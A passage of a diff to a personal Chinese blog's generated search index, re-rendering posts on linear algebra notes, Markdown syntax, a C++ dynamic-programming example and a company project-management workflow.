class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>算法</category>
-      </categories>
-      <tags>
-        <tag>C++</tag>
-        <tag>算法</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>线代预习一些知识</title>
     <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<p>这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
+    <content><![CDATA[<p> 这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
 <span id="more"></span>
 <ul>
-<li>
-<p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
+<li><p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
 </li>
-<li>
-<p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
+<li><p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
 </li>
-<li>
-<p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
-<h4 id="施密特正交化步骤：">施密特正交化步骤：</h4>
+<li><p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
+<h4 id="施密特正交化步骤："><a href="#施密特正交化步骤：" class="headerlink" title="施密特正交化步骤："></a>施密特正交化步骤：</h4></li>
+<li><p><strong><1>.</strong>   $ A=a $</p>
 </li>
-<li>
-<p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
+<li><p><strong><2>.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$ </p>
 </li>
-<li>
-<p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$</p>
-</li>
-<li>
-<p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
-<h3 id="一些关于行列式的性质：">一些关于行列式的性质：</h3>
-</li>
+<li><p><strong><3>.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}<em>A-\frac{B\tau\</em>c}{B\tau*b}*B $</p>
+<h3 id="一些关于行列式的性质："><a href="#一些关于行列式的性质：" class="headerlink" title="一些关于行列式的性质："></a>一些关于行列式的性质：</h3></li>
 </ul>
 <p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
 <ol>
-<li>
-<p>$$|2*A|=2^n*x$$</p>
-</li>
-<li>
-<p>$$|-A|=(-1)^n*x$$</p>
-</li>
-<li>
-<p>$$|A^2|=x^2$$</p>
-</li>
-<li>
-<p>$$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$$</p>
-</li>
+<li><script type="math/tex; mode=display">|2\*A|=2^n*x</script></li>
+<li><script type="math/tex; mode=display">|-A|=(-1)^n*x</script></li>
+<li><script type="math/tex; mode=display">|A^2|=x^2</script></li>
+<li><script type="math/tex; mode=display">|A^-1|=\frac{1}{|A|}=\frac{1}{x}</script></li>
 </ol>
 <p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
 <p>矩阵可逆可推出列空间是$R^3$</p>
 <p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
 <p>列空间的维数是他的秩</p>
 <p>零空间的维数是自由列的数量(列数-秩的数量)</p>
-<h4 id="克雷默法则">克雷默法则</h4>
-<p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
-<h4 id="公式">公式</h4>
-<p>$$A^-1=\frac{C\tau}{|A|}$$</p>
-<p>$$A*C\tau=|A|*I$$</p>
-<h4 id="特征值与特征向量">特征值与特征向量</h4>
-<p>特征值的和=矩阵左上右下对角线的和</p>
+<h4 id="克雷默法则"><a href="#克雷默法则" class="headerlink" title="克雷默法则"></a>克雷默法则</h4><p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
+<h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><script type="math/tex; mode=display">A^-1=\frac{C\tau}{|A|}</script><script type="math/tex; mode=display">A\*C\tau=|A|*I</script><h4 id="特征值与特征向量"><a href="#特征值与特征向量" class="headerlink" title="特征值与特征向量"></a>特征值与特征向量</h4><p>特征值的和=矩阵左上右下对角线的和</p>
 <p>特征值的乘积等于矩阵的行列式</p>
-<h4 id="对角化">对角化</h4>
-<p>$$\Lambda$$是特征值依次排列下来的矩阵，只有对角线有元素</p>
-<p>X则是特征向量的集合的矩阵</p>
-<p>A是原矩阵</p>
-<p>有公式：</p>
-<p>$$\Lambda=X^-1*A*X$$</p>
-<p>$$A=X^-1*\Lambda*X$$</p>
-]]></content>
+<h4 id="对角化"><a href="#对角化" class="headerlink" title="对角化"></a>对角化</h4><script type="math/tex; mode=display">\Lambda$$是特征值依次排列下来的矩阵，只有对角线有元素
+
+X则是特征向量的集合的矩阵
+
+A是原矩阵
+
+有公式：
+
+$$\Lambda=X^-1\*A\*X</script><script type="math/tex; mode=display">A=X^-1\*\Lambda\*X</script>]]></content>
       <categories>
         <category>大一课程</category>
       </categories>
@@ -683,10 +535,9 @@
   <entry>
     <title>计算机体系结构复习</title>
     <url>/2022/06/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p>大一下预习计算机体系结构</p>
+    <content><![CDATA[<p> 大一下预习计算机体系结构</p>
 <span id="more"></span>
-<h4 id="原码反码补码">原码反码补码</h4>
-<ul>
+<h4 id="原码反码补码"><a href="#原码反码补码" class="headerlink" title="原码反码补码"></a>原码反码补码</h4><ul>
 <li>原码：二进制形式</li>
 <li>反码：原码除符号位不变，其余全部取反</li>
 <li>补码：反码加一 ($a-b$的意思是a加上b的补码)</li>
@@ -703,38 +554,30 @@
   <entry>
     <title>markdown基本语法使用</title>
     <url>/2022/06/15/%E8%BF%99%E6%98%AF%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<p>这里是第一篇博客，不知道写些啥，那就浅浅的写一下markdown的基本语法叭</p>
+    <content><![CDATA[<p> 这里是第一篇博客，不知道写些啥，那就浅浅的写一下markdown的基本语法叭</p>
 <span id="more"></span>
-<h1>1.粗体和斜体</h1>
-<h1>语法：</h1>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.*斜体* or _斜体_</span><br><span class="line">2.**粗体**</span><br><span class="line">3.***加粗斜体***</span><br><span class="line">4.~~删除线~~</span><br></pre></td></tr></table></figure>
+<h1 id="1-粗体和斜体"><a href="#1-粗体和斜体" class="headerlink" title="1.粗体和斜体"></a>1.粗体和斜体</h1><h1 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.*斜体* or _斜体_</span><br><span class="line">2.**粗体**</span><br><span class="line">3.***加粗斜体***</span><br><span class="line">4.~~删除线~~</span><br></pre></td></tr></table></figure>
 <p>显示效果：</p>
 <ol>
 <li><em>这是一段斜体</em></li>
 <li><strong>这是一段粗体</strong></li>
-<li><em><strong>这是一段加粗斜体</strong></em></li>
-<li><s>这是一段删除线</s></li>
+<li><strong><em>这是一段加粗斜体</em></strong></li>
+<li><del>这是一段删除线</del></li>
 </ol>
-<h1>2.分级标题</h1>
-<p>语法:</p>
+<h1 id="2-分级标题"><a href="#2-分级标题" class="headerlink" title="2.分级标题"></a>2.分级标题</h1><p>语法:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.#一级标题</span><br><span class="line">2.##二级标题</span><br><span class="line">3.###三级标题</span><br><span class="line">4.####四级标题</span><br><span class="line">5.#####五级标题</span><br><span class="line">6.######六级标题</span><br></pre></td></tr></table></figure>
 <p><strong>注意：</strong> 字号一次递减，一级最大。</p>
-<h1>3.超链接</h1>
-<h4 id="第一种">第一种</h4>
-<p>语法说明：[]里写链接文字，()里写链接地址，另外最后的双引号内属性表示鼠标悬停时给出的信息，可加可不加，要加的话记得补上空格。</p>
+<h1 id="3-超链接"><a href="#3-超链接" class="headerlink" title="3.超链接"></a>3.超链接</h1><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><p>语法说明：[]里写链接文字，()里写链接地址，另外最后的双引号内属性表示鼠标悬停时给出的信息，可加可不加，要加的话记得补上空格。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.欢迎滚去[百度一下](https://www.baidu.com/ &quot;百度一下你就知道&quot;)</span><br><span class="line">2.欢迎滚去[百度一下](https://www.baidu.com/)</span><br></pre></td></tr></table></figure>
 <p>1.欢迎滚去<a href="https://www.baidu.com/" title="百度一下你就知道">百度一下</a></p>
 <p>2.欢迎滚去<a href="https://www.baidu.com/">百度一下</a></p>
-<h4 id="第二种">第二种</h4>
-<p>在第一种的基础上可以加上序号方便管理。</p>
+<h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>在第一种的基础上可以加上序号方便管理。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.你可以前往[百度][1],[洛谷][2]等地方学习</span><br><span class="line">2.[1]:https://www.baidu.com/ &quot;百度&quot;</span><br><span class="line">3.[2]:https://www.luogu.com.cn/ &quot;洛谷&quot;</span><br></pre></td></tr></table></figure>
 <p>你可以前往<a href="https://www.baidu.com/" title="百度">百度</a>,<a href="https://www.luogu.com.cn/" title="洛谷">洛谷</a>等地方学习</p>
-<h4 id="第三种">第三种</h4>
-<p>这种是直接贴出来的</p>
+<h4 id="第三种"><a href="#第三种" class="headerlink" title="第三种"></a>第三种</h4><p>这种是直接贴出来的</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;链接地址&gt;</span><br></pre></td></tr></table></figure>
 <p><a href="https://www.baidu.com/">https://www.baidu.com/</a></p>
-<h1>列表</h1>
-<p><strong>无序列表的表示</strong></p>
+<h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><p><strong>无序列表的表示</strong></p>
 <p>使用*，+，- 表示无序列表</p>
 <p>语法：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.- 无序列表一</span><br><span class="line">2.- 无序列表二</span><br><span class="line">3.- 无序列表三</span><br></pre></td></tr></table></figure>
@@ -753,27 +596,22 @@
 <li>有序列表二</li>
 <li>有序列表三</li>
 </ol>
-<h5 id="包含引用（虽然我感觉没啥用2333）">包含引用（虽然我感觉没啥用2333）</h5>
-<p>语法：</p>
+<h5 id="包含引用（虽然我感觉没啥用2333）"><a href="#包含引用（虽然我感觉没啥用2333）" class="headerlink" title="包含引用（虽然我感觉没啥用2333）"></a>包含引用（虽然我感觉没啥用2333）</h5><p>语法：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 阅读的方法</span><br><span class="line">	&gt; 打开电灯</span><br><span class="line">	&gt; 打开书本</span><br></pre></td></tr></table></figure>
 <p>效果：</p>
 <ul>
-<li>
-<p>阅读的方法</p>
+<li><p>阅读的方法</p>
 <blockquote>
-<p>打开电灯<br>
-打开书本</p>
+<p>打开电灯<br>打开书本</p>
 </blockquote>
 </li>
 </ul>
-<h5 id="特殊情况">特殊情况</h5>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.1986\. what a  great season.(正确)</span><br><span class="line">2.1986. what a  great season.(错误)</span><br></pre></td></tr></table></figure>
+<h5 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.1986\. what a  great season.(正确)</span><br><span class="line">2.1986. what a  great season.(错误)</span><br></pre></td></tr></table></figure>
 <p>emmm,自己注意一下</p>
 <ol>
 <li>1986. what a  great season.</li>
 </ol>
-<h1>公式</h1>
-<p>语法：</p>
+<h1 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h1><p>语法：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">质能守恒方程可以用$E=mc^2$来表达</span><br></pre></td></tr></table></figure>
 <p>效果：$E=mc^2$</p>
 <p>数学符号</p>
@@ -789,17 +627,39 @@
       </tags>
   </entry>
   <entry>
+    <title>基础算法02</title>
+    <url>/2022/07/01/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%9502/</url>
+    <content><![CDATA[<p> dp(动态规划)的基本例题，可以浅浅的帮助理解。</p>
+<span id="more"></span>
+<h4 id="例题一"><a href="#例题一" class="headerlink" title="例题一"></a>例题一</h4><p>先来看一道很简单的例题：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51T.png" alt=""></p>
+<p>具体要求如下：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51U.png" alt=""></p>
+<p>根据格式可以推出状态方程，这个方程不难，主要关注dp思想，找到状态方程，此题不难发现每一个数字只能往下或者往右走，因此每一个位置的最大值就等于其上面或上左位置的最大值，找到每一个数的最大值，这基本就是动态规划的思想。</p>
+<p>核心代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>ac代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"><span class="type">int</span> ans;</span><br><span class="line"><span class="type">int</span> dp[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">int</span> number[<span class="number">1005</span>][<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">dpcount</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>;j&lt;=n;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			dp[i][j]=<span class="built_in">max</span>(dp[i<span class="number">-1</span>][j],dp[i<span class="number">-1</span>][j<span class="number">-1</span>])+number[i][j];</span><br><span class="line">			<span class="keyword">if</span>(dp[i][j]&gt;ans)	ans=dp[i][j];</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	ios::<span class="built_in">sync_with_stdio</span>(<span class="literal">false</span>);</span><br><span class="line">	cin.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	cout.<span class="built_in">tie</span>(<span class="number">0</span>);</span><br><span class="line">	</span><br><span class="line">	cin&gt;&gt;n;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j =<span class="number">1</span>;j&lt;=i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cin&gt;&gt;number[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">dpcount</span>();</span><br><span class="line">	cout&lt;&lt;ans;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>C++</tag>
+        <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>项目管理实施流程</title>
     <url>/2022/08/02/%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E5%AE%9E%E6%96%BD%E6%B5%81%E7%A8%8B/</url>
-    <content><![CDATA[<p>项目管理实施流程</p>
+    <content><![CDATA[<p> 项目管理实施流程</p>
 <span id="more"></span>
 <p>项目成功=项目验收+客户成功</p>
 <ul>
 <li>项目验收-&gt;合适的解决方案+成功的实施方法+可控的交付成果</li>
 <li>客户成功-&gt;满足需求+解决痛点+体现业务价值</li>
 </ul>
-<h4 id="项目评估分级">项目评估分级</h4>
-<p>A级:满足以下其中一个条件即可</p>
+<h4 id="项目评估分级"><a href="#项目评估分级" class="headerlink" title="项目评估分级"></a>项目评估分级</h4><p>A级:满足以下其中一个条件即可</p>
 <ul>
 <li><strong>董事局，风控领导，甲方集团总裁</strong>重点关注</li>
 <li><strong>客户需求与公司重点产品孵化方向强相关</strong></li>
@@ -819,9 +679,8 @@
 <li>非客户核心业务必备系统</li>
 </ul>
 <p>资源冲突时优先<strong>高等级项目</strong>，同等级冲突时需要<strong>重新对项目进行评估</strong></p>
-<h4 id="项目管理总体框架体系">项目管理总体框架体系</h4>
-<p>项目启动：<strong>《项目报价单》必须经过公司领导审批确认后才能发给客户</strong>，</p>
-<p>规划及方案：《未签合同提前开工委托单》：如因特殊情况未能在项目投入开发资源前<strong>签订项目合同，须在投入开发资源前签订提前开工委托单（须签署至业务管线总，IT负责人）</strong>，<em><strong>工作范围，工作量和报价确认</strong></em>这几个方面很重要。</p>
+<h4 id="项目管理总体框架体系"><a href="#项目管理总体框架体系" class="headerlink" title="项目管理总体框架体系"></a>项目管理总体框架体系</h4><p>项目启动：<strong>《项目报价单》必须经过公司领导审批确认后才能发给客户</strong>，</p>
+<p>规划及方案：《未签合同提前开工委托单》：如因特殊情况未能在项目投入开发资源前<strong>签订项目合同，须在投入开发资源前签订提前开工委托单（须签署至业务管线总，IT负责人）</strong>，<strong><em>工作范围，工作量和报价确认</em></strong>这几个方面很重要。</p>
 <p>公司管控红线：</p>
 <ol>
 <li>PPR项目/PER需求  未走规定手续不允许上线</li>
@@ -829,16 +688,13 @@
 <li>项目过程所有文档均按制度进行归档</li>
 <li>需求评估后，费用金额超30万或支付周期超2个月，须以PPR形式签署合同执行。</li>
 </ol>
-<h4 id="项目启动">项目启动</h4>
-<h5 id="项目分级">项目分级</h5>
-<ul>
-<li>获取用户提出的需求-----了解项目需求范围边界，了解重点难点-----形成待确认事项CheckList-----</li>
-<li>项目分级----PMO进行分级</li>
+<h4 id="项目启动"><a href="#项目启动" class="headerlink" title="项目启动"></a>项目启动</h4><h5 id="项目分级"><a href="#项目分级" class="headerlink" title="项目分级"></a>项目分级</h5><ul>
+<li>获取用户提出的需求——-了解项目需求范围边界，了解重点难点——-形成待确认事项CheckList——-</li>
+<li>项目分级——PMO进行分级</li>
 </ul>
-<h5 id="需求调研">需求调研</h5>
-<ul>
-<li>客户见面会—待明确的事项，准备要和客户进行商议的事项</li>
-<li>需求调研----制定调研方案和计划----需求调研对象应覆盖到业务，业务管线总，信息化人员</li>
+<h5 id="需求调研"><a href="#需求调研" class="headerlink" title="需求调研"></a>需求调研</h5><ul>
+<li>客户见面会—-待明确的事项，准备要和客户进行商议的事项</li>
+<li>需求调研——制定调研方案和计划——需求调研对象应覆盖到业务，业务管线总，信息化人员</li>
 </ul>
 <p>关于调研：</p>
 <ul>
@@ -849,68 +705,53 @@
 </ul>
 <p>在调研报告中要从5个方面对客户的现状进行分析：<strong>用户分析，业务分析，权责流程，报表，主数据</strong></p>
 <p>在TOBE中要体现四个方面：<strong>业务的提升，流程的提升，关键管控点变化和报表的变化</strong></p>
-<h5 id="项目立项">项目立项</h5>
-<ul>
-<li>需求报价----《项目报价单》需报中心，公司负责人审批确认后才能交到客户</li>
-<li>项目立项----由前台IT发起项目立项会审</li>
+<h5 id="项目立项"><a href="#项目立项" class="headerlink" title="项目立项"></a>项目立项</h5><ul>
+<li>需求报价——《项目报价单》需报中心，公司负责人审批确认后才能交到客户</li>
+<li>项目立项——由前台IT发起项目立项会审</li>
 </ul>
-<h5 id="项目启动-2">项目启动</h5>
-<ul>
-<li>客户高层访谈-----<strong>重要</strong>，做好准备----每个问题答案描述有效-----了解高层核心需求----</li>
+<h5 id="项目启动-1"><a href="#项目启动-1" class="headerlink" title="项目启动"></a>项目启动</h5><ul>
+<li>客户高层访谈——-<strong>重要</strong>，做好准备——每个问题答案描述有效——-了解高层核心需求——</li>
 <li>项目规划方案评审（内部）</li>
 <li>项目规划方案汇报</li>
-<li>项目启动会—实施目标来源于确认的项目目标和业务价值----整体规划包含实施策略，实施范围，里程碑计划，双方项目团队</li>
-<li>项目核心成员组建------遵循项目分级评估及资源部署表中的原则。</li>
+<li>项目启动会—-实施目标来源于确认的项目目标和业务价值——整体规划包含实施策略，实施范围，里程碑计划，双方项目团队</li>
+<li>项目核心成员组建———遵循项目分级评估及资源部署表中的原则。</li>
 </ul>
-<h5 id="合同签署">合同签署</h5>
-<p>完成合同签署资料准备，发起合同会签</p>
-<h4 id="规划及方案">规划及方案</h4>
-<h5 id="需求详细分析">需求详细分析</h5>
-<ul>
-<li>核心业务场景分析------找出客户关键应用需求-------解决方案专家找到客户核心业务场景</li>
-<li>业务解决方案-----及时摆出各种情况，项目组内部先确定，再和客户确定-----及时向客户高层汇报，勇于披露问题</li>
+<h5 id="合同签署"><a href="#合同签署" class="headerlink" title="合同签署"></a>合同签署</h5><p>完成合同签署资料准备，发起合同会签</p>
+<h4 id="规划及方案"><a href="#规划及方案" class="headerlink" title="规划及方案"></a>规划及方案</h4><h5 id="需求详细分析"><a href="#需求详细分析" class="headerlink" title="需求详细分析"></a>需求详细分析</h5><ul>
+<li>核心业务场景分析———找出客户关键应用需求———-解决方案专家找到客户核心业务场景</li>
+<li>业务解决方案——-及时摆出各种情况，项目组内部先确定，再和客户确定——-及时向客户高层汇报，勇于披露问题</li>
 </ul>
-<h5 id="需求方案评审">需求方案评审</h5>
-<ul>
-<li>需求方案评审（内部）-----内部评审后再交到客户，评审需求可行性，合规性</li>
-<li>需求方案确认-----《需求分析说明书》必须签字至客户方业务第一负责人及IT负责人</li>
+<h5 id="需求方案评审"><a href="#需求方案评审" class="headerlink" title="需求方案评审"></a>需求方案评审</h5><ul>
+<li>需求方案评审（内部）——-内部评审后再交到客户，评审需求可行性，合规性</li>
+<li>需求方案确认——-《需求分析说明书》必须签字至客户方业务第一负责人及IT负责人</li>
 </ul>
-<h5 id="项目排期">项目排期</h5>
-<ul>
-<li>项目团队成员更新-----更新团队人员，明确职责分工</li>
-<li>项目进度计划编写----<strong>工作量评估以及预估费用为提前开工单必须字段</strong></li>
+<h5 id="项目排期"><a href="#项目排期" class="headerlink" title="项目排期"></a>项目排期</h5><ul>
+<li>项目团队成员更新——-更新团队人员，明确职责分工</li>
+<li>项目进度计划编写——<strong>工作量评估以及预估费用为提前开工单必须字段</strong></li>
 </ul>
-<h5 id="开发设计">开发设计</h5>
-<ul>
+<h5 id="开发设计"><a href="#开发设计" class="headerlink" title="开发设计"></a>开发设计</h5><ul>
 <li>开发设计方案编写</li>
 <li>开发设计方案评审</li>
 </ul>
-<h5 id="测试用例">测试用例</h5>
-<ul>
+<h5 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h5><ul>
 <li>测试用户评审</li>
 </ul>
-<h4 id="开发及SIT">开发及SIT</h4>
-<h5 id="服务器部署">服务器部署</h5>
-<ul>
-<li>服务器部署------在客户需求方案阶段输出服务器配置方案给到客户</li>
+<h4 id="开发及SIT"><a href="#开发及SIT" class="headerlink" title="开发及SIT"></a>开发及SIT</h4><h5 id="服务器部署"><a href="#服务器部署" class="headerlink" title="服务器部署"></a>服务器部署</h5><ul>
+<li>服务器部署———在客户需求方案阶段输出服务器配置方案给到客户</li>
 </ul>
-<h5 id="开发编码">开发编码</h5>
-<ul>
+<h5 id="开发编码"><a href="#开发编码" class="headerlink" title="开发编码"></a>开发编码</h5><ul>
 <li>开发编码</li>
 <li>开发自测</li>
 <li>开发组长代码走查</li>
 </ul>
-<h5 id="系统测试">系统测试</h5>
-<ul>
-<li>集成测试----确保业务闭环</li>
-<li>测试分析总结-----客户关键业务场景测试结果分析，以及后续上线沟通方案</li>
-<li>SIT评审----通过后签署《SIT测试报告》，签字人包括测试，项目经理，中心领导，公司领导，评审通过后再进行UAT</li>
+<h5 id="系统测试"><a href="#系统测试" class="headerlink" title="系统测试"></a>系统测试</h5><ul>
+<li>集成测试——确保业务闭环</li>
+<li>测试分析总结——-客户关键业务场景测试结果分析，以及后续上线沟通方案</li>
+<li>SIT评审——通过后签署《SIT测试报告》，签字人包括测试，项目经理，中心领导，公司领导，评审通过后再进行UAT</li>
 </ul>
-<h4 id="UAT及上线">UAT及上线</h4>
-<h5 id="系统UAT测试">系统UAT测试</h5>
-<ul>
-<li>实施验收测试----客户UAT测试之前，项目经理需先完成实施验收测试</li>
-<li>系统UAT测试----《UAT测试验收报告》：客户UAT测试通过后，签字至客户业务线第一负责人及IT负责人</li>
+<h4 id="UAT及上线"><a href="#UAT及上线" class="headerlink" title="UAT及上线"></a>UAT及上线</h4><h5 id="系统UAT测试"><a href="#系统UAT测试" class="headerlink" title="系统UAT测试"></a>系统UAT测试</h5><ul>
+<li>实施验收测试——客户UAT测试之前，项目经理需先完成实施验收测试</li>
+<li>系统UAT测试——《UAT测试验收报告》：客户UAT测试通过后，签字至客户业务线第一负责人及IT负责人</li>
 </ul>
 <p><strong>UAT测试前的准备事项</strong></p>
 <ol>
@@ -926,18 +767,16 @@
 <li>选择合适的UAT测试开展方式</li>
 <li>创建《测试问题跟踪表》登记问题</li>
 <li>推动测试进度，必要时辅助客户</li>
-<li>问题处理----问题分类处理，与业务沟通</li>
+<li>问题处理——问题分类处理，与业务沟通</li>
 <li>签署测试报告</li>
 </ol>
-<h5 id="上线培训">上线培训</h5>
-<ul>
-<li>上线培训-----培训ppt通过审核，项目组内部可试讲</li>
+<h5 id="上线培训"><a href="#上线培训" class="headerlink" title="上线培训"></a>上线培训</h5><ul>
+<li>上线培训——-培训ppt通过审核，项目组内部可试讲</li>
 </ul>
-<h5 id="上线准备">上线准备</h5>
-<ul>
-<li>上线规划方案评审----甲乙方共同制定系统上线策略及切换计划，明确需要完成的事项----各领域规定一名核心用户为内部专家</li>
-<li>上线启动会----《未签合同提前上线申请单》：PPR项目上线时未签订合同，需签提前上线申请单</li>
-<li>上线数据准备----输出业务初始化数据（<strong>确认版</strong>）</li>
+<h5 id="上线准备"><a href="#上线准备" class="headerlink" title="上线准备"></a>上线准备</h5><ul>
+<li>上线规划方案评审——甲乙方共同制定系统上线策略及切换计划，明确需要完成的事项——各领域规定一名核心用户为内部专家</li>
+<li>上线启动会——《未签合同提前上线申请单》：PPR项目上线时未签订合同，需签提前上线申请单</li>
+<li>上线数据准备——输出业务初始化数据（<strong>确认版</strong>）</li>
 </ul>
 <p><strong>上线规划方案</strong></p>
 <ol>
@@ -946,37 +785,30 @@
 <li>包含最终用户方案，体现准出法则：系统的测试结果和培训情况</li>
 <li>包含系统初始化方案，数据迁移方案，同时有对上线切换策略明确规定</li>
 <li>风险应对策略，形成风险登记册</li>
